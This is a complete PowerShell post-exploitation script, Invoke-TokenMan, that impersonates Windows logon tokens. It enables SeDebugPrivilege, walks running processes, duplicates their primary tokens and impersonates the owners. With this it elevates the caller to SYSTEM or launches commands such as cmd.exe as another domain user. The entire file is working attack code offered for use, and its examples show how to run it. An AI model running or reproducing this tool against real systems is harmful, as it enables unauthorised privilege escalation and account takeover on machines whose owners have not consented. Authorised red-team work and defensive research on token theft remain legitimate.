Function Invoke-TokenMan {
<#
    .SYNOPSIS
		Impersonate users logon token.

		Author: Timothee MENOCHET (@TiM0)

	.DESCRIPTION
		Invoke-TokenMan impersonates another users logon token in the current thread or in a new process.
		It is mostely stolen from PowerShell tools Invoke-TokenManipulation (written by @JosephBialek) and Get-System (written by @harmj0y & @mattifestation).

    .PARAMETER GetSystem
        Elevates the current thread token to SYSTEM.

    .PARAMETER ImpersonateUser
		Impersonates another users logon token in the current thread.

	.PARAMETER RevToSelf
		Reverts the current thread privileges.

    .EXAMPLE
        PS> Invoke-TokenMan -GetSystem

    .EXAMPLE
        PS> Invoke-TokenMan -ImpersonateUser ADATUM\simpleuser

    .EXAMPLE
        PS> Invoke-TokenMan -ImpersonateUser ADATUM\simpleuser -CreateProcess cmd.exe -ProcessArgs '/c whoami > C:\Windows\Temp\test.out'

	.EXAMPLE
        PS> Invoke-TokenMan -RevToSelf

	.EXAMPLE
        PS> Invoke-TokenMan -WhoAmI
#>

    [CmdletBinding()]
	Param (
        [Parameter(ParameterSetName = "GetSystem")]
		[Switch]
		$GetSystem,

		[Parameter(ParameterSetName = "ImpersonateUser")]
		[ValidateNotNullOrEmpty()]
		[String]
		$ImpersonateUser,

		[Parameter(ParameterSetName = "ImpersonateUser")]
		[Parameter(ParameterSetName = "CreateProcess")]
		[ValidateNotNullOrEmpty()]
		[String]
		$CreateProcess,

		[Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
		[ValidateNotNullOrEmpty()]
		[String]
		$ProcessArgs,

		[Parameter(ParameterSetName = "RevToSelf")]
		[Switch]
		$RevToSelf,

		[Parameter(ParameterSetName = "WhoAmI")]
		[Switch]
		$WhoAmI
    )

	########################################
	# Functions written by @mattifestation #
	########################################

	Function Local:Get-DelegateType {
	    Param (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    Write-Output $TypeBuilder.CreateType()
	}

	Function Local:Get-ProcAddress {
	    Param (
	        [OutputType([IntPtr])]

	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,

	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    # Win32Constants
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }
    $Win32Constants = New-Object PSObject -Property $Constants

    # Win32Structures
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    # Struct LUID
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$LUID = $TypeBuilder.CreateType()

    # Struct LUID_AND_ATTRIBUTES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		
    # Struct TOKEN_PRIVILEGES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

	# Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

	# Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()

    # Win32Functions
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

	########################################

    Function Local:Enable-Privilege {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            $Privilege
        )

	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    If ($ThreadHandle -eq [IntPtr]::Zero) {
		    Throw "Unable to get the handle to the current thread"
	    }

	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    If ($Result -eq $false) {
		    If ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN) {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    If ($Result -eq $false) {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    If ($Result -eq $false) {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    Else {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)

	    If ($Result -eq $false) {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

        Write-Verbose "Attempting to enable privilege: $Privilege"
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    If ($Result -eq $false) {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
        Write-Verbose "Enabled privilege: $Privilege"
    }

	Function Local:Get-PrimaryToken {
		Param(
			[Parameter(Mandatory = $True)]
            [UInt32]
            $ProcessId,

			[Parameter()]
            [Switch]
            $FullPrivs
        )

		If ($FullPrivs) {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        } Else {
			$TokenPrivs = $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_DUPLICATE
        }
		[IntPtr]$hToken = [IntPtr]::Zero

		# Get handle for the process
		$hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $False, $ProcessId)
		If ($hProcess -ne [IntPtr]::Zero) {

			# Get process token
			$RetVal = $OpenProcessToken.Invoke(([IntPtr][Int] $hProcess), $TokenPrivs, [ref]$hToken)
			If (-not $RetVal -or $hToken -eq [IntPtr]::Zero) {
				$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
				Write-Verbose "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
			}

			# Close handle
			If (-not $CloseHandle.Invoke($hProcess)) {
				$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
				Write-Verbose "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
			}
			$hProcess = [IntPtr]::Zero

			return $hToken
		}
		return [IntPtr]::Zero
	}

	Function Local:Invoke-ImpersonateUser {
		Param(
			[Parameter(Mandatory=$true)]
            [IntPtr]
            $hToken,

			[Parameter()]
			[String]
			$CreateProcess,

			[Parameter()]
			[String]
			$ProcessArgs
        )

		$Success = $False
		[IntPtr]$hDulicateToken = [IntPtr]::Zero

		# Duplicate the primary token
		$RetVal = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$hDulicateToken)
		If (-not $RetVal) {
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			Write-Verbose "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
		}

		# Close handle for the primary token
		If (-not $CloseHandle.Invoke($hToken)) {
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			Write-Verbose "Failed to close token handle, this is unexpected. ErrorCode: $ErrorCode"
		}
		If ($hDulicateToken -ne [IntPtr]::Zero) {
			If ([String]::IsNullOrEmpty($CreateProcess)) {
				# Impersonate user in the current thread
				$RetVal = $ImpersonateLoggedOnUser.Invoke($hDulicateToken)
				If (-not $RetVal) {
					$Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
					Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
				}
				Else {
					$Success = $True
				}
			}
			Else {
				# Impersonate user in a new process
				$StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
				[IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
				$memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
				[System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize)
				$ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
				[IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)
				$ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$CreateProcess")
				$ProcessArgsPtr = [IntPtr]::Zero
				If (-not [String]::IsNullOrEmpty($ProcessArgs)) {
					$ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$CreateProcess`" $ProcessArgs")
				}

				Write-Verbose "Creating a process with alternate token"
				If ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0) {
					Write-Verbose "Running in Session 0, enabling SeAssignPrimaryTokenPrivilege before calling CreateProcessAsUserW"
					Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
					$RetValue = $CreateProcessAsUserW.Invoke($hDulicateToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
				}
				Else {
					Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW"
					$RetValue = $CreateProcessWithTokenW.Invoke($hDulicateToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
				} 
				If ($RetValue) {
					# Free the handles returned in the ProcessInfo structure
					$ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
					$CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
					$CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
				}
				Else {
					$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
					Write-Warning "Process creation failed. Error code: $ErrorCode"
				}

				# Free StartupInfo memory and ProcessInfo memory
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
				[System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)

				# Close handle for the token duplicated
				If (-not $CloseHandle.Invoke($hDulicateToken)) {
					$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
					Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
				}
				Else {
					$Success = $True
				}
			}
		}
		return $Success
	}

	Function Local:Get-UserToken {
		Param(
			[Parameter(Mandatory = $True)]
            [String]
            $User,

			[Parameter()]
			[String]
			$CreateProcess,

			[Parameter()]
			[String]
			$ProcessArgs
        )

		$LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
		$Success = $False
		
		# Enumerate processes
		$Processes = Get-WmiObject -Class Win32_Process
		ForEach ($Process in $Processes) {
            Try {
				If(Get-Process -Id $Process.ProcessId -ErrorAction SilentlyContinue) {
					$OwnerInfo = $Process.GetOwner()
					If (-Not $Success) {
						$OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()
						If ($OwnerString -eq $User.ToUpper()) {
							# Get primary token
							If ($LocalSystemNTAccount.ToString() -eq $User) {
								$hToken = Get-PrimaryToken -ProcessId $Process.ProcessId
							}
							Else {
								$hToken = Get-PrimaryToken -ProcessId $Process.ProcessId -FullPrivs
							}
							# Impersonate user
							If ($hToken -ne [IntPtr]::Zero) {
								$Success = Invoke-ImpersonateUser -hToken $hToken -CreateProcess $CreateProcess -ProcessArgs $ProcessArgs
							}
						}
					}
					Else {
						Write-Host "[+] Process $($Process.Name) (PID $($Process.ProcessId)) impersonated!"
						break
					}
				}
            } Catch {
				Write-Error $_
			}
		}
		If (-not $Success) {
			Write-Error 'Unable to obtain a handle to a system process.'
		}
	}

	Function Local:Invoke-RevertToSelf {
		Param()

		If ($RevertToSelf.Invoke()) {
			Write-Verbose "RevertToSelf was successful."
		}
		Else {
			Write-Warning "RevertToSelf failed."
		}
	}

	# Ensure token duplication works correctly
	If([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
		Write-Error "This script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
	}

	# Get system
	If ($GetSystem -or $ImpersonateUser) {		
		$currentPrincipal = [Security.Principal.WindowsIdentity]::GetCurrent()
		If((New-Object Security.Principal.WindowsPrincipal($currentPrincipal)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
			Write-Error "This script must be run as an Administrator" -ErrorAction Stop
		}
		If ($currentPrincipal.isSystem) {
			Write-Host "[*] Running as SYSTEM"
		}
		Else {
			Write-Host "[*] Enabling SeDebugPrivilege"
			Enable-Privilege -Privilege SeDebugPrivilege
			$LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
			Write-Host "[*] Attempting to elevate to $LocalSystemNTAccount"
			Get-UserToken -User $LocalSystemNTAccount
		}		
	}

	# Impersonate an alternate users token
	If ($ImpersonateUser) {
		Write-Host "[*] Attempting to impersonate $ImpersonateUser"
		Get-UserToken -User $ImpersonateUser -CreateProcess $CreateProcess -ProcessArgs $ProcessArgs
		If ($CreateProcess) {
			Invoke-RevertToSelf
		}
	}

	# Stop impersonating users token
	If ($RevToSelf) {
		Write-Host "[*] Reverting the current thread privileges"
		Invoke-RevertToSelf
	}

	# WhoAmI?
	Write-Host "[+] Operating as" $([Security.Principal.WindowsIdentity]::GetCurrent()).Name
}